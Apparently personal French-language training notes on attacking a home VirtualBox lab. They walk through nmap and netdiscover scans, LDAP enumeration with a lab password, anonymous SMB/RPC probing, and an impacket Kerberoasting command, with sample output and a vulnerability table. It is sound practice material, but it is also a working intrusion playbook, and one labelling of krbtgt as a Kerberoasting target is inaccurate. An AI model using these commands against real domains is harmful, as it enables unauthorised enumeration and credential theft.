---
## Lab Hacking
---

- Test 

```
Votre lab est parfait pour pratiquer car :
✅ Active Directory    → cible privilégiée en entreprise
✅ IIS + SQL Server    → vulnérabilités web classiques
✅ PFsense             → règles pare-feu à contourner
✅ Utilisateurs AD     → mots de passe faibles (Azerty123!)
✅ Partages réseau     → mauvaises configurations NTFS
```

- Catégories d'attaques possibles
```
1. Reconnaissance      → scanner le réseau,ports, servers, Os
2. Attaques AD         → Kerberoasting, Pass-the-Hash, BloodHound
3. Attaques Web        → SQL Injection sur IIS
4. Lateral Movement    → se déplacer d'une machine à l'autre
5. Privilege Escalation→ devenir Administrateur du domaine
```

- Les deux types de reconnaissance
 ```
- Passive → on observe sans interagir avec la cible
          (OSINT, Shodan, DNS lookup)

- Active  → on envoie des paquets vers la cible
          (nmap, netdiscover) ← ce qu'on va faire
```

- Outils

```
netdiscover : Découvrir les machines actives sur le réseau
nmap : Scanner les ports et services
nmap --script : Détecter les vulnérabilités
```

---
- Réseau : ip, Netdiscover, Nmap
---

- Étape 1 — Vérifiez que Kali voit le réseau
```
ip addr show vboxnet0
```
> Doit afficher 192.168.56.1/24

```
ping 192.168.56.10
```
> $ ping 192.168.56.10
>>PING 192.168.56.10 (192.168.56.10) 56(84) bytes of data.

> ip addr show vboxnet0
>> 4: vboxnet0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
>>  link/ether 0a:00:27:00:00:00 brd ff:ff:ff:ff:ff:ff
>>  inet 192.168.56.1/24 brd 192.168.56.255 scope global vboxnet0



- Étape 2 — Netdiscover
```
sudo netdiscover -r 192.168.56.0/24 -i vboxnet0
```
> Résultat
```
    IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.56.2    08:00:27:dd:6b:cc      1      42  PCS Systemtechnik GmbH                                      
 192.168.56.10   08:00:27:b9:41:4a      1      42  PCS Systemtechnik GmbH                                      
 192.168.56.20   08:00:27:4c:87:66      1      42  PCS Syste
```


- Étape 3 — Nmap scan rapide
> Scannez tous les ports ouverts sur le réseau :

```
nmap -sV -sC 192.168.56.0/24 --open
```

```
nmap -sV -sC 192.168.56.0/24 --open -T4 \
    --exclude 192.168.56.1 \
    -oN ~/formationtssr/projetinfrastructure/recon/scan_initial.txt
```

	- Créez d'abord le dossier recon
```
mkdir -p ~/formationtssr/projetinfrastructure/recon
```
	- Puis affichez uniquement l'essentiel
```
nmap -sV -sC 192.168.56.0/24 --open -T4 \
    --exclude 192.168.56.1 \
    -oN ~/formationtssr/projetinfrastructure/recon/scan_initial.txt \
    && grep -E "Nmap scan|open|SERVICE|Host:" \
    ~/formationtssr/projetinfrastructure/recon/scan_initial.txt
```

- 🔍 Analyse — 192.168.56.2 (PFsense)
```
PORT 53  → DNS Unbound
PORT 80  → HTTP nginx → redirige vers HTTPS
PORT 443 → HTTPS nginx → interface admin PFsense

⚠️  Certificat SSL auto-signé exposé
⚠️  Interface admin accessible depuis le réseau
```

- 🔍 Analyse — 192.168.56.10 (AD-Server)
```
PORT 22   → SSH OpenSSH ← accès direct au serveur
PORT 53   → DNS
PORT 88   → Kerberos    ← cible Kerberoasting
PORT 139  → NetBIOS
PORT 389  → LDAP        ← énumération AD possible
PORT 445  → SMB         ← cible Pass-the-Hash
PORT 5985 → WinRM       ← exécution de commandes à distance

✅ SMB signing enabled and required  → protégé contre relay attacks
⚠️  LDAP ouvert → énumération des utilisateurs AD possible
⚠️  Kerberos ouvert → Kerberoasting possible
```

- 🔍 Analyse — 192.168.56.20 (SRV-Web)
```
PORT 80   → IIS 10.0    ← cible web
PORT 135  → RPC
PORT 139  → NetBIOS
PORT 445  → SMB
PORT 5985 → WinRM

⚠️  TRACE method enabled → vulnérabilité XST possible
⚠️  SMB signing NOT required → vulnérable aux relay attacks !
⚠️  IIS version exposée → Microsoft-IIS/10.0
```

- 🎯 Vulnérabilités identifiées
```
AD-Server	LDAP énumération	🟡 Moyen
AD-Server	Kerberoasting		🔴 Élevé
SRV-Web		SMB signing désactivé	🔴 Élevé
SRV-Web		TRACE method IIS	🟡 Moyen
PFsense		Interface admin exposée 🟡 Moyen
```
---
## Énumération LDAP
---
- Étape 1 — Vérifiez les outils disponibles
```
which ldapsearch
which enum4linux
which enum4linux-ng
```

- Étape 2 — Tentative anonyme 
```
ldapsearch -x \
    -H ldap://192.168.56.10 \
    -b "DC=monlabo,DC=local" \
    -s sub "(objectClass=*)" \
    2>/dev/null | head -50
```

> L'accès anonyme est bloqué — c'est une bonne configuration de sécurité sur votre AD. Il faut des credentials valides.


- Étape 3 — Énumération avec credentials
```
ldapsearch -x \
    -H ldap://192.168.56.10 \
    -D "jdupont@monlabo.local" \
    -w "Azerty123!" \
    -b "DC=monlabo,DC=local" \
    "(objectClass=user)" \
    sAMAccountName cn mail department \
    2>/dev/null
```

- 🔍 Informations via LDAP
```
Utilisateurs :
├── Administrateur        ← compte admin du domaine
├── krbtgt                ← compte Kerberos → cible Kerberoasting
├── jdupont               ← Jean Dupont / Informatique
├── mmartin               ← Marie Martin / Informatique
└── pdurand               ← Pierre Durand / RH

Ordinateurs :
├── AD-SERVER$
├── WIN10-CLIENT1$
├── WIN10-CLIENT2$
└── SRV-WEB$
```


⚠️ Ce que ça signifie pour un attaquant
```
Avec un simple compte utilisateur (jdupont) →
on peut lister TOUS les objets du domaine :
✅ Noms des comptes
✅ Structure des OUs
✅ Machines du domaine
✅ Compte krbtgt → cible pour Golden Ticket
```
---
## Test SANS credentials
---

```
# Énumération SMB anonyme
enum4linux -a 192.168.56.10
```

```
# Tenter une session nulle SMB
smbclient -L //192.168.56.10 -N
```

```
# Chercher des infos via RPC anonyme
rpcclient -U "" -N 192.168.56.10
```

> Ces attaques exploitent SMB/RPC au lieu de LDAP — parfois moins bien protégés.

- Test enum4linux sans credentials
```
enum4linux -a 192.168.56.10 2>/dev/null | tee ~/formationtssr/projetinfrastructure/recon/enum4linux.txt
```
- Et smbclient
```
smbclient -L //192.168.56.10 -N
```
> Résultat

```
==( Users on 192.168.56.10 via RID cycling (RIDS: 500-550,1000-1050) )==================

[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                       

 ===============================( Getting printer info for 192.168.56.10 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                         
enum4linux complete on Sun Apr  5 13:47:08 2026
┌──(jukali㉿kali)-[~/formationtssr/projetinfrastructure/recon]
└─$ smbclient -L //192.168.56.10 -N                                                                             
Anonymous login successful
        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.56.10 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

- Analyse
```
enum4linux :
❌ RID cycling     → bloqué (NT_STATUS_ACCESS_DENIED)
❌ RPC anonyme     → bloqué
❌ Imprimantes     → bloqué

smbclient :
✅ Anonymous login successful  ← connexion anonyme acceptée !
❌ Pas de partages visibles    ← mais rien d'accessible
❌ SMB1 désactivé              ← bonne sécurité
```

- Étape 3 — Lancez le Kerberoasting
```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
    monlabo.local/jdupont:Azerty123! \
    -dc-ip 192.168.56.10 \
    -request \
    -outputfile ~/formationtssr/projetinfrastructure/recon/kerberoast_hashes.txt
```

